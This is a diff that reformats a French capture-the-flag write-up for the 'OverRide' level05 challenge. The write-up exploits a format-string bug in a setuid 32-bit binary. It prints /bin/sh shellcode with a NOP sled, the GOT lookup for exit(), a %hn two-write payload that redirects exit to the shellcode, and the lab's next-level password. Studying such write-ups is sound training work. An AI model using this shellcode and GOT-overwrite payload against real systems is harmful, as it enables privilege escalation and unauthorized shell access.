@@ -1,60 +1,58 @@
 ### level05
 
 On commence par faire un file level05:
-```
-level05@OverRide:~$ file level05
-level05: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1a9c02d3aeffff53ee0aa8c7730cbcb1ab34270e, not stripped
-```
+	
+	level05@OverRide:~$ file level05
+	level05: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1a9c02d3aeffff53ee0aa8c7730cbcb1ab34270e, not stripped
+	
 On voit que le binaire est en ELF 32-bit.
 Il n'y a aucunes securite particuliere apparement.
-
 En regardant le code de plus pres on remarque une faille de type format string vulnerability (voir source).
-
 Aussi apres le printf un appel a la fonction exit() est fait.
-
 On peut donc modifier l'adresse de exit dans la GOT pour faire pointer la fonction sur notre shellcode que l'on va stocker dans une variable d'environnement.
-
 On export notre shellcode qui fait un simple system(/bin/sh):
-```
-export SHELLCODE=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
-```
+	
+	export SHELLCODE=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+	
 
 On a besoins de recuper l'adresse de exit() dans la GOT. DU coup on fait:
-```
-level05@OverRide:~$ objdump -R ./level05
+	
+	level05@OverRide:~$ objdump -R ./level05
 
-./level05:     file format elf32-i386
+	./level05:     file format elf32-i386
 
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE 
-080497c4 R_386_GLOB_DAT    __gmon_start__
-080497f0 R_386_COPY        stdin
-080497d4 R_386_JUMP_SLOT   printf
-080497d8 R_386_JUMP_SLOT   fgets
-080497dc R_386_JUMP_SLOT   __gmon_start__
-080497e0 R_386_JUMP_SLOT   exit
-080497e4 R_386_JUMP_SLOT   __libc_start_main
-```
+	DYNAMIC RELOCATION RECORDS
+	OFFSET   TYPE              VALUE 
+	080497c4 R_386_GLOB_DAT    __gmon_start__
+	080497f0 R_386_COPY        stdin
+	080497d4 R_386_JUMP_SLOT   printf
+	080497d8 R_386_JUMP_SLOT   fgets
+	080497dc R_386_JUMP_SLOT   __gmon_start__
+	080497e0 R_386_JUMP_SLOT   exit
+	080497e4 R_386_JUMP_SLOT   __libc_start_main
+	
 
 L'addresse de exit ou l'on veut ecrire est: "080497e0"
 
 Maintenant il faut aller chercher l'adresse de notre shellcode dans gdb:
-```
-(gdb) b main
-(gdb ) r
-(gdb) x/200s environ
-0xffffd4c8:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
-0xffffd590:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
-0xffffd658:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
-```
-On choisi une adresse qui tombe en plein milieu des NOPE: 0xffffd8b0
+	
+	(gdb) b main
+	(gdb ) r
+	(gdb) x/200s environ
+	0xffffd4c8:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+	0xffffd590:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+	0xffffd658:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+	
+On choisi une adresse qui tombe en plein milieu des NOPE :
+
+	0xffffd8b0
 
 Maintenant on cherche a quel endroit le printf ecrit:
-```
-level05@OverRide:~$ ./level05
-AAAA.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X
-aaaa.64.f7fcfac0.f7ec3af9.ffffd2cf.ffffd2ce.0.ffffffff.ffffd354.f7fdb000.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e
-```
+	
+	level05@OverRide:~$ ./level05
+	AAAA.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X
+	aaaa.64.f7fcfac0.f7ec3af9.ffffd2cf.ffffd2ce.0.ffffffff.ffffd354.f7fdb000.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e
+	
 On voit qu'il ecrit a la 10eme position.
 
 Le probleme est que l'adresse de notre shellcode en decimal est superieur au int max.
@@ -63,26 +61,26 @@ On est aussi obliger d'ecrire sur 2 adresses. la premiere est l'adresse de exit 
 
 On decoupe donc l'adresse en 2: 0xffff | d8b0
 
-```
-FFFF = 65535
+	
+	FFFF = 65535
 
-d8b0 = 55472 - 8 (pour les 2 adresses écrites avant) = 55464 (octets de poids faibles).
+	d8b0 = 55472 - 8 (pour les 2 adresses écrites avant) = 55464 (octets de poids faibles).
 
-65535 - 55472 = 10063 (octets de poids forts)
-```
+	65535 - 55472 = 10063 (octets de poids forts)
+	
 
 On peut maintenant construire notre payload:
-```
-payload: (python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55464d%10$hn" + "%10063d%11$hn"'; cat) | ./level05
-```
+	
+	(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55464d%10$hn" + "%10063d%11$hn"'; cat) | ./level05
+	
 
 Ce qui nous donne:
-```
-ls
-ls: cannot open directory .: Permission denied
-cd ../level06
-cat .pass
-h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
-```
+	
+	ls
+	ls: cannot open directory .: Permission denied
+	cd ../level06
+	cat .pass
+	h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+	
 
 SUCCESS!!!
